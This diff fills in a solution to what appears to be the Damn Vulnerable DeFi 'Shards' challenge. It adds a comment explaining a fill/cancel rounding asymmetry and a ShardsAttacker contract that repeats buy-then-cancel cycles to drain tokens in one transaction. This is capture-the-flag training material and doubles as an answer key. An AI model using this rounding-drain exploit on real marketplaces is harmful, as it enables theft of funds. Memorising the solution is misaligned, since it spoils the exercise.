@@ -110,11 +110,28 @@ contract ShardsChallenge is Test {
         assertEq(token.balanceOf(player), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
+     /**
+     * =========================================================
+     * SOLUTION - test_shards()
+     * =========================================================
+     * Attack: fill/cancel rounding asymmetry (round-down buy, round-up refund)
+     * fill() charges want.mulDivDown(toDVT(price,rate), totalShards); for
+     * want <= 133 this rounds to ZERO DVT. cancel() refunds the same shards as
+     * want.mulDivUp(rate, 1e6) = 9.975e12 DVT - so each buy-then-cancel cycle
+     * extracts ~9.975e12 DVT for free.
+     * 1. Player deploys an attacker; its constructor is the only player tx.
+     * 2. The attacker loops 7519 same-block fill(133)+cancel cycles. Buying 133
+     *    shards costs 0 (rounds down); cancelling refunds 9.975e12 (rounds up).
+     *    Same-block cancel passes the time guard; never fully fills, so the
+     *    offer stays open and cancel() is allowed.
+     * 3. Total extracted ~7.5e16 DVT (> the required threshold); staking pool
+     *    is never touched. The attacker forwards everything to recovery.
+     *
+     * Single player tx (constructor); player ends holding 0 tokens.
+     * =========================================================
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsAttacker(address(marketplace), address(token), recovery);
     }
 
     /**
@@ -135,4 +152,49 @@ contract ShardsChallenge is Test {
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
     }
+}
+
+/**
+ * =========================================================
+ * SOLUTION CONTRACT - ShardsAttacker
+ * =========================================================
+ * Runs the whole free-extraction loop in its constructor (a single player tx).
+ * Each iteration buys 133 shards for 0 DVT (fill rounds down) and immediately
+ * cancels for a 9.975e12 DVT refund (cancel rounds up), netting free DVT every
+ * cycle. After enough cycles to clear the win threshold it forwards the entire
+ * extracted balance to the recovery address.
+ * Placed after the test class per DVDv4 convention.
+ * =========================================================
+ *
+ * @notice One-transaction Shards rounding drainer.
+ * @dev Buys at offer 1 with want=133 (cost 0), same-block cancel (refund 9.975e12).
+ */
+contract ShardsAttacker {
+    uint256 private constant WANT = 133;        // largest amount whose fill cost rounds to 0
+    uint256 private constant CYCLES = 7519;     // enough refunds to clear the win threshold
+
+    constructor(address marketplace, address token, address recovery) {
+        IShardsMarket m = IShardsMarket(marketplace);
+
+        for (uint256 i = 0; i < CYCLES; i++) {
+            // Buy 133 shards of offer 1; cost rounds DOWN to 0 DVT.
+            uint256 idx = m.fill(1, WANT);
+            // Same-block cancel; refund rounds UP to 133 * rate / 1e6 DVT.
+            m.cancel(1, idx);
+        }
+
+        // Forward all extracted DVT to recovery; player keeps nothing.
+        IERC20Like t = IERC20Like(token);
+        t.transfer(recovery, t.balanceOf(address(this)));
+    }
+}
+
+interface IShardsMarket {
+    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex);
+    function cancel(uint64 offerId, uint256 purchaseIndex) external;
+}
+
+interface IERC20Like {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
 }
